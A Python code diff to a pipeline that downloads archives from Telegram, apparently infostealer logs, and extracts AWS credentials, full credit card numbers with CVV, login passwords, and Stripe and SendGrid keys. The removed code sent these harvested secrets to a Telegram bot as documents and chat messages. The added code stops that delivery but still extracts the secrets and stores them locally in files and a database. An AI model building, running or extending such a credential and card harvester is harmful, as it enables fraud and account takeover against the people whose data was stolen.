@@ -11,7 +11,6 @@ import time
 from dataclasses import dataclass
 from pathlib import Path
 from urllib.parse import urlparse
-import aiohttp
 import uvicorn
 from telethon import TelegramClient, events
 from telethon.errors import AuthKeyDuplicatedError, FloodWaitError
@@ -21,9 +20,9 @@ from config import Settings, load_settings
 from database_manager import DatabaseManager, Job
 from extractor import ArchiveProcessor
 from parse_credentials import scan_tree, write_results, extract_raw_credentials
-from parse_credit_cards import extract_credit_cards, format_credit_card_line, write_credit_cards_file
-from parse_passwords import extract_passwords, format_password_line, write_passwords_file
-from parse_api_keys import extract_api_keys, format_api_key_line, write_api_keys_file
+from parse_credit_cards import extract_credit_cards, write_credit_cards_file
+from parse_passwords import extract_passwords, write_passwords_file
+from parse_api_keys import extract_api_keys, write_api_keys_file
 from parse_archive_passwords import extract_archive_passwords_from_messages
 from password_store import PasswordStore
 from session_store import SessionStore
@@ -370,44 +369,15 @@ class Pipeline:
         except Exception: LOG.exception('Progress notification failed',extra={'message_id':reply_to,'stage':'notification'}); return None
 
     async def notify_cred_bot(self, text: str, document: Path | None = None) -> bool:
-        """Send credential alerts through the dedicated Telegram bot (Bot API)."""
-        token = self.s.cred_alert_bot_token
-        chat_id = self.s.cred_alert_chat_id
-        if not token or not chat_id:
-            return False
-        base = f'https://api.telegram.org/bot{token}'
-        try:
-            timeout = aiohttp.ClientTimeout(total=30)
-            async with aiohttp.ClientSession(timeout=timeout) as session:
-                if document is not None and document.is_file():
-                    form = aiohttp.FormData()
-                    form.add_field('chat_id', str(chat_id))
-                    form.add_field('caption', text[:1024])
-                    form.add_field(
-                        'document',
-                        document.read_bytes(),
-                        filename=document.name,
-                        content_type='text/plain',
-                    )
-                    async with session.post(f'{base}/sendDocument', data=form) as resp:
-                        payload = await resp.json(content_type=None)
-                        if not payload.get('ok'):
-                            raise RuntimeError(payload.get('description') or f'HTTP {resp.status}')
-                else:
-                    async with session.post(
-                        f'{base}/sendMessage',
-                        json={'chat_id': chat_id, 'text': text[:4096]},
-                    ) as resp:
-                        payload = await resp.json(content_type=None)
-                        if not payload.get('ok'):
-                            raise RuntimeError(payload.get('description') or f'HTTP {resp.status}')
-            return True
-        except Exception:
-            LOG.exception('Credential bot alert failed', extra={'stage': 'cred-alert'})
-            return False
+        """Never send extracted secrets to Telegram. Dashboard/DB only."""
+        LOG.info(
+            'Skipping Telegram credential-bot delivery',
+            extra={'stage': 'cred-alert', 'has_document': bool(document and document.is_file())},
+        )
+        return False
 
     async def alert_credentials(self, job: Job, raw_creds: list[dict]) -> None:
-        """Persist + push found credentials to the alert bot whenever configured."""
+        """Persist found AWS credentials locally. Do not send them to Telegram."""
         if not raw_creds:
             return
         await asyncio.to_thread(self.db.save_credentials, job.id, raw_creds)
@@ -417,23 +387,8 @@ class Pipeline:
             lambda: (creds_file.write_text('\n'.join(creds_lines) + '\n', encoding='utf-8'), creds_file.chmod(0o600))
         )
         unique_files = len({c['file'] for c in raw_creds})
-        source = job.source_link or job.source or 'job'
-        caption = (
-            f"🔑 AWS credentials found\n"
-            f"Job #{job.id}\n"
-            f"Source: {source}\n"
-            f"Count: {len(raw_creds)}\n"
-            f"Files: {unique_files}"
-        )
-        # Prefer document upload so long credential lists are not truncated.
-        sent = await self.notify_cred_bot(caption, document=creds_file)
-        if not sent:
-            # Fallback to chunked plain text if document send failed / bot unset.
-            body = caption + "\n\n" + "\n".join(creds_lines)
-            for start in range(0, len(body), 3500):
-                await self.notify_cred_bot(body[start:start + 3500])
         LOG.info(
-            'Credentials extracted and alerted',
+            'Credentials extracted (Telegram delivery disabled)',
             extra={
                 'job_id': job.id,
                 'message_id': job.message_id,
@@ -444,33 +399,15 @@ class Pipeline:
         )
 
     async def alert_credit_cards(self, job: Job, cards: list[dict]) -> None:
-        """Persist + push found credit cards to the alert bot whenever configured."""
+        """Persist found credit cards locally. Do not send them to Telegram."""
         if not cards:
             return
         await asyncio.to_thread(self.db.save_credit_cards, job.id, cards)
         cards_file = self.s.output_dir / f'credit-cards-{job.message_id}.txt'
-        card_lines = [format_credit_card_line(card) for card in cards]
-        await asyncio.to_thread(
-            lambda: (
-                write_credit_cards_file(cards, cards_file),
-            )
-        )
+        await asyncio.to_thread(write_credit_cards_file, cards, cards_file)
         unique_files = len({c['file'] for c in cards})
-        source = job.source_link or job.source or 'job'
-        caption = (
-            f"💳 Credit cards found\n"
-            f"Job #{job.id}\n"
-            f"Source: {source}\n"
-            f"Count: {len(cards)}\n"
-            f"Files: {unique_files}"
-        )
-        sent = await self.notify_cred_bot(caption, document=cards_file)
-        if not sent:
-            body = caption + "\n\n" + "\n".join(card_lines)
-            for start in range(0, len(body), 3500):
-                await self.notify_cred_bot(body[start:start + 3500])
         LOG.info(
-            'Credit cards extracted and alerted',
+            'Credit cards extracted (Telegram delivery disabled)',
             extra={
                 'job_id': job.id,
                 'message_id': job.message_id,
@@ -481,29 +418,15 @@ class Pipeline:
         )
 
     async def alert_passwords(self, job: Job, records: list[dict]) -> None:
-        """Persist + push found login passwords to the alert bot whenever configured."""
+        """Persist found login passwords locally. Do not send them to Telegram."""
         if not records:
             return
         await asyncio.to_thread(self.db.save_passwords, job.id, records)
         passwords_file = self.s.output_dir / f'passwords-{job.message_id}.txt'
-        password_lines = [format_password_line(record) for record in records]
         await asyncio.to_thread(write_passwords_file, records, passwords_file)
         unique_files = len({r['file'] for r in records})
-        source = job.source_link or job.source or 'job'
-        caption = (
-            f"🔑 Passwords found\n"
-            f"Job #{job.id}\n"
-            f"Source: {source}\n"
-            f"Count: {len(records)}\n"
-            f"Files: {unique_files}"
-        )
-        sent = await self.notify_cred_bot(caption, document=passwords_file)
-        if not sent:
-            body = caption + "\n\n" + "\n".join(password_lines)
-            for start in range(0, len(body), 3500):
-                await self.notify_cred_bot(body[start:start + 3500])
         LOG.info(
-            'Passwords extracted and alerted',
+            'Passwords extracted (Telegram delivery disabled)',
             extra={
                 'job_id': job.id,
                 'message_id': job.message_id,
@@ -514,38 +437,15 @@ class Pipeline:
         )
 
     async def alert_api_keys(self, job: Job, keys: list[dict]) -> None:
-        """Persist + push found SendGrid/Stripe keys to the alert bot whenever configured."""
+        """Persist found SendGrid/Stripe keys locally. Do not send them to Telegram."""
         if not keys:
             return
         await asyncio.to_thread(self.db.save_api_keys, job.id, keys)
         keys_file = self.s.output_dir / f'api-keys-{job.message_id}.txt'
-        key_lines = [format_api_key_line(key) for key in keys]
-        await asyncio.to_thread(
-            lambda: (
-                write_api_keys_file(keys, keys_file),
-            )
-        )
+        await asyncio.to_thread(write_api_keys_file, keys, keys_file)
         unique_files = len({k['file'] for k in keys})
-        by_type: dict[str, int] = {}
-        for key in keys:
-            key_type = str(key.get('key_type') or '')
-            by_type[key_type] = by_type.get(key_type, 0) + 1
-        source = job.source_link or job.source or 'job'
-        caption = (
-            f"🔑 API keys found\n"
-            f"Job #{job.id}\n"
-            f"Source: {source}\n"
-            f"Count: {len(keys)}\n"
-            f"Files: {unique_files}\n"
-            f"Types: {', '.join(f'{k}={v}' for k, v in sorted(by_type.items()))}"
-        )
-        sent = await self.notify_cred_bot(caption, document=keys_file)
-        if not sent:
-            body = caption + "\n\n" + "\n".join(key_lines)
-            for start in range(0, len(body), 3500):
-                await self.notify_cred_bot(body[start:start + 3500])
         LOG.info(
-            'API keys extracted and alerted',
+            'API keys extracted (Telegram delivery disabled)',
             extra={
                 'job_id': job.id,
                 'message_id': job.message_id,
@@ -1192,7 +1092,7 @@ class Pipeline:
             await self.notify(job.chat_id,scan_msg,job.message_id)
             LOG.info('Credential scan complete',extra={'job_id':job.id,'message_id':job.message_id,'files_scanned':summary['files_scanned'],'findings':summary['findings'],'stage':'processing'})
             
-            # Extract raw credentials and alert via bot (and legacy chat notify when present).
+            # Extract raw credentials for the dashboard. Never send secrets to Telegram.
             await self.notify(job.chat_id,'🔑 Extracting raw AWS credentials…',job.message_id)
             raw_creds=await asyncio.to_thread(
                 extract_raw_credentials, root, 8, self.s.output_dir, self.s.max_scan_file_bytes
@@ -1200,29 +1100,7 @@ class Pipeline:
 
             if raw_creds:
                 await self.alert_credentials(job, raw_creds)
-                if job.chat_id:
-                    creds_file=self.s.output_dir/f'credentials-{job.message_id}.txt'
-                    unique_files=len(set(c['file'] for c in raw_creds))
-                    creds_msg=(
-                        f"🔑 AWS Credentials Extracted (key:secret:region)\n"
-                        f"📊 Total credentials found: {len(raw_creds)}\n"
-                        f"📁 Files containing credentials: {unique_files}\n"
-                        f"✅ Credentials file ready to download"
-                    )
-                    await self.notify(job.chat_id,creds_msg,job.message_id)
-                    if self.client is not None and creds_file.is_file():
-                        try:
-                            await self.client.send_file(
-                                job.chat_id, str(creds_file), caption=creds_msg, reply_to=job.message_id
-                            )
-                        except Exception:
-                            LOG.exception(
-                                'Could not send credentials file to chat',
-                                extra={'job_id': job.id, 'message_id': job.message_id, 'stage': 'notification'},
-                            )
             else:
-                if job.chat_id:
-                    await self.notify(job.chat_id,'⚠️ No raw AWS credentials found in extracted files',job.message_id)
                 LOG.info('No raw credentials found',extra={'job_id':job.id,'message_id':job.message_id,'stage':'processing'})
 
             await self.notify(job.chat_id,'💳 Scanning for credit cards…',job.message_id)
@@ -1231,16 +1109,7 @@ class Pipeline:
             )
             if raw_cards:
                 await self.alert_credit_cards(job, raw_cards)
-                if job.chat_id:
-                    cards_msg=(
-                        f"💳 Credit cards extracted (cardnum|month|year|cvv)\n"
-                        f"📊 Total cards found: {len(raw_cards)}\n"
-                        f"📁 Files containing cards: {len(set(c['file'] for c in raw_cards))}"
-                    )
-                    await self.notify(job.chat_id, cards_msg, job.message_id)
             else:
-                if job.chat_id:
-                    await self.notify(job.chat_id,'⚠️ No credit cards found in extracted files',job.message_id)
                 LOG.info('No credit cards found', extra={'job_id': job.id, 'message_id': job.message_id, 'stage': 'processing'})
 
             # Login-password stealer extraction is opt-in. The default scan walks every
@@ -1253,16 +1122,7 @@ class Pipeline:
                 )
                 if raw_passwords:
                     await self.alert_passwords(job, raw_passwords)
-                    if job.chat_id:
-                        passwords_msg=(
-                            f"🔑 Passwords extracted (url|username|password)\n"
-                            f"📊 Total passwords found: {len(raw_passwords)}\n"
-                            f"📁 Files containing passwords: {len(set(r['file'] for r in raw_passwords))}"
-                        )
-                        await self.notify(job.chat_id, passwords_msg, job.message_id)
                 else:
-                    if job.chat_id:
-                        await self.notify(job.chat_id,'⚠️ No passwords found in extracted files',job.message_id)
                     LOG.info('No passwords found', extra={'job_id': job.id, 'message_id': job.message_id, 'stage': 'processing'})
             else:
                 LOG.info(
@@ -1276,16 +1136,7 @@ class Pipeline:
             )
             if raw_keys:
                 await self.alert_api_keys(job, raw_keys)
-                if job.chat_id:
-                    keys_msg=(
-                        f"🔑 SendGrid/Stripe keys extracted\n"
-                        f"📊 Total keys found: {len(raw_keys)}\n"
-                        f"📁 Files containing keys: {len(set(k['file'] for k in raw_keys))}"
-                    )
-                    await self.notify(job.chat_id, keys_msg, job.message_id)
             else:
-                if job.chat_id:
-                    await self.notify(job.chat_id,'⚠️ No SendGrid or Stripe keys found in extracted files',job.message_id)
                 LOG.info('No API keys found', extra={'job_id': job.id, 'message_id': job.message_id, 'stage': 'processing'})
             
             # Send redacted reports (best-effort — chat bans must not fail a completed scan).
